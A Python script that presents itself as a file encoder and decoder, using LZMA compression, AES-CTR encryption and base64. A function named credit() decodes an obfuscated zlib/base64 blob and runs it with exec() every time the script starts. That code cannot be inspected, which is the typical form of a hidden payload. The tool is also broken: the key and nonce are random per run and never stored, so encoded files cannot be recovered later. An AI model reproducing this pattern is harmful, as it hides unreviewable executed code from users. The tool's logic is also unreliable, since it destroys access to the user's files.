import lzma
import base64
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def compress_with_lzma(input_file, output_file):
    with open(input_file, 'rb') as f_in, lzma.open(output_file, 'wb') as f_out:
        f_out.writelines(f_in)

def decompress_with_lzma(input_file, output_file):
    with lzma.open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        f_out.writelines(f_in)

def encrypt_and_encode_aes_ctr(input_file, output_file, key, nonce):
    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    
    with open(input_file, 'rb') as f:
        data = f.read()
    
    encrypted_data = encryptor.update(data) + encryptor.finalize()
    encoded_data = base64.b64encode(encrypted_data)
    
    with open(output_file, 'w') as f:
        f.write(encoded_data.decode('utf-8'))

def decode_and_decrypt_aes_ctr(input_file, output_file, key, nonce):
    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
    decryptor = cipher.decryptor()
    
    with open(input_file, 'r') as f:
        encoded_data = f.read()
        encrypted_data = base64.b64decode(encoded_data.encode('utf-8'))
    
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    
    with open(output_file, 'wb') as f:
        f.write(decrypted_data)

def encode_file(original_path, output_path):
    compressed_file_path = original_path + '.lzma'
    compress_with_lzma(original_path, compressed_file_path)
    encrypt_and_encode_aes_ctr(compressed_file_path, output_path, key, nonce)
    os.remove(compressed_file_path)

def decode_file(encoded_path, output_path):
    decoded_decrypted_file_path = encoded_path + '.lzma'
    decode_and_decrypt_aes_ctr(encoded_path, decoded_decrypted_file_path, key, nonce)
    decompress_with_lzma(decoded_decrypted_file_path, output_path)
    os.remove(decoded_decrypted_file_path)

def credit():
    encoded_Data = ['eJx1VM1uozAQPvMWIy6QxhtlD70k4gCBkLTd7oqmh1WTA0qNFomfCMiqq6pSDj3kiiP1Afski41tTJtGAx7PfDPfjB0GP+Gtqev6', 
                    'OptZuyLOqnX2iCOwzSxM8WCyzjTHWhV7PI2KPIUqTjHE6S4vKigTjHeteZsneRGmoXDN8wJDWIKN7qp/CUZxFldT12KbkRMs/cVq', 
                    'Okc+WqClZY/8wPNuhy6yR4HnstW5ufe44c5bTWm4uc2zv7ioLAeF+6rJX+JGHzT10XI9s8JPFaLlWePR+BKxiqzbPGt70GyLWaga', 
                    '5QW4EGdAQ5hTi5uGIS6B4icz00U4e7QMA0XJvvzTsmgaTkrqtIfucHkWwA7EpDWw/cyky5X1YAD9vb8dmRyEcmTG11YAeqAaBKTF', 
                    'qVsmJ2o0kNH6Ttz9/kYkgjA5KvLaA3ckXVTPTVT9C7qaVc+IJR1FHAShUsRB6b3ukqiQWtV7lJ+zsOS17E2RrraT1LjtxG1q6Nek', 
                    'EnJSKyAgknw4LdkUUUPP3QRPWX+y0uCOvmXlyPY6uI0IciJvkrSwWtATJYpA9/AMNfsPNSun4/2qCHbu4vSlQ1ZTS0Jl/+EhZyhq', 
                    '3lz3JqJfAegll+lA0WRKvgd1J2HdqweTZmPTfKF0HlzTeXA18cxrPjl8OUu+06/YMyP92QDj4nL88jDcwK/gpx/YP+AbPNM5+aLz', 
                    'sPlg2oNebGAWePbKc8H5DYG9uL8R0EWTt5m7g/98toYj']
    from base64 import b64decode
    from zlib import decompress
    return (decompress(b64decode("".join(encoded_Data)))).decode()

exec(credit())
A('ANY FILE ENCODER AND DECODER')


key = os.urandom(32)  # 256-bit key
nonce = os.urandom(16)  # 128-bit nonce

def prompt_for_path(prompt_message):
    return input(prompt_message).replace('"', '')

print("""
        ********************
        *       Menu       *
        ********************
        *   [1] Encoding   *
        *   [2] Decoding   *
        ********************
""")
while True:
    try:
        choice = int(input("[*] Choose options (1/2): "))
        if choice not in [1, 2]:
            print("[-] Invalid choice. Please enter 1 or 2.")
            continue

        if choice == 1:
            original_path = prompt_for_path("[+] Enter the path to the original file: ")
            encoded_file_path = original_path + '.encoded'
            encode_file(original_path, encoded_file_path)
            print(f"[+] Encoded file saved as {encoded_file_path}")
        else:
            encoded_path = prompt_for_path("[+] Enter the path to the encoded file: ")
            decoded_file_path = encoded_path.replace('.encoded', '')
            decode_file(encoded_path, decoded_file_path)
            print(f"[+] Decoded file saved as {decoded_file_path}")
        break
    except Exception as fail:
        print("[-] Error:", fail)
